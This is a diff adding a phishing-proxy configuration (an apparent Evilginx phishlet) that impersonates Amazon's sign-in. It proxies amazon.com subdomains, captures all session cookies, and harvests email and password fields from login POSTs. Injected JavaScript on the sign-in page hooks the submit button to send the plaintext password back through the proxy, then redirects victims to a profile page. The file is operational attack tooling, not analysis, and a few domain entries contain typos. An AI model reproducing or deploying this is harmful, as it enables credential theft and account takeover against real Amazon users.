@@ -1,0 +1,172 @@
+author: "@An0nud4y"
+min_ver: "3.2.0"
+proxy_hosts:
+  - {
+      phish_sub: "www",
+      orig_sub: "www",
+      domain: "amazon.com",
+      session: true,
+      is_landing: true,
+    }
+  - {
+      phish_sub: "fls-na",
+      orig_sub: "fls-na",
+      domain: "amazon.com",
+      session: false,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "images-na",
+      orig_sub: "images-na",
+      domain: "ssl-images-amazon.com",
+      session: false,
+      is_landing: false,
+    }
+sub_filters:
+  - {
+      triggers_on: "www.amazon.com",
+      orig_sub: "www",
+      domain: "amazon.com",
+      search: 'action="https://{hostname}',
+      replace: 'action="https://{hostname}',
+      mimes: ["text/html", "application/json"],
+    }
+  - {
+      triggers_on: "www.amazon.com",
+      orig_sub: "www",
+      domain: "amazon.com",
+      search: 'href="https://{hostname}',
+      replace: 'href="https://{hostname}',
+      mimes: ["text/html", "application/json"],
+    }
+  - {
+      triggers_on: "fls-na.amazon.com",
+      orig_sub: "fls-na",
+      domain: "amazon.com",
+      search: 'action="https://{hostname}',
+      replace: 'action="https://{hostname}',
+      mimes: ["text/html", "application/json"],
+    }
+  - {
+      triggers_on: "fls-na.amazon.com",
+      orig_sub: "fls-na",
+      domain: "amazon.com",
+      search: 'href="https://{hostname}',
+      replace: 'href="https://{hostname}',
+      mimes: ["text/html", "application/json"],
+    }
+  - {
+      triggers_on: "images-na.ssl-iamges-amazon.com",
+      orig_sub: "images-na",
+      domain: "ssl-iges-amazon.com",
+      search: 'action="https://{hostname}',
+      replace: 'action="https://{hostname}',
+      mimes: ["text/html", "application/json"],
+    }
+  - {
+      triggers_on: "images-na.ssl-iamges-amazon.com",
+      orig_sub: "images-na",
+      domain: "ssl-images-amazon.com",
+      search: 'href="https://{hostname}',
+      replace: 'href="https://{hostname}',
+      mimes: ["text/html", "application/json"],
+    }
+auth_tokens:
+  - domain: ".amazon.com"
+    keys: [".*,regexp"]
+  - domain: "www.amazon.com"
+    keys: ["csm-hit,opt", ".*,regexp"]
+auth_urls:
+  - '/manage-your-profiles/*'
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'unenc_password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'unenc_password'
+      search: '(.*)'
+      type: 'post'
+    - key: 'appActionToken'
+      search: '(.*)'
+      type: 'post'
+    - key: 'appAction'
+      search: '(.*)'
+      type: 'post'
+    - key: 'subPageType'
+      search: '(.*)'
+      type: 'post'    
+    - key: 'prevRID'
+      search: '(.*)'
+      type: 'post'
+    - key: 'workflowState'
+      search: '(.*)'
+      type: 'post'
+    - key: 'logs'
+      search: '(.*)'
+      type: 'post'
+    - key: 'xemail'
+      search: '(.*)'
+      type: 'post'
+    - key: 'xpassowrd'
+      search: '(.*)'
+      type: 'post'
+login:
+  domain: "www.amazon.com"
+  path: "/ap/signin?_encoding=UTF8&ignoreAuthState=1&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0"
+js_inject:
+  - trigger_domains: ["www.amazon.com"]
+    trigger_paths: ["/ap/signin/\\d+-\\d+-\\d+"]
+    trigger_params: []
+    script: |  
+      var startscript = "Script started at " + new Date().toISOString();
+
+      var startRequest = new XMLHttpRequest();
+      startRequest.open("POST", '/', true);
+      startRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+      startRequest.send("logs=" + encodeURIComponent(startscript));
+
+      function onclickListener() {
+        var submit = document.querySelectorAll('input[type="submit"]')[0];
+        submit.setAttribute("onclick", "sendPass()");
+        submit.addEventListener("click", sendPass);
+        return;
+      }
+
+      function sendPass() {
+        var password = document.getElementsByName("password")[0].value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("unenc_password=" + encodeURIComponent(password));
+
+        // Add logs for sendPass
+        var sendPassLog = "sendPass executed at " + new Date().toISOString();
+        var sendPassRequest = new XMLHttpRequest();
+        sendPassRequest.open("POST", '/', true);
+        sendPassRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        sendPassRequest.send("logs=" + encodeURIComponent(sendPassLog));
+
+        return;
+      }
+
+      setTimeout(function() {
+        onclickListener();
+      }, 1000);
+  - trigger_domains: ['www.amazon.com']
+    trigger_paths: ['/']
+    script: |
+      setTimeout(function () {
+        (function () {
+          'use strict';
+          let subdomain = window.location.host.split('.')[0];
+          if (subdomain === "www" && window.location.pathname === '/') {
+            window.location.href = "/manage-your-profiles/home?ref_=ya_manage_your_profiles?ref_=ya_your_profile_rich-card";
+            console.log("Redirecting to heeee");
+          }
+        }());
+      }, 10000); // 10 seconds delay
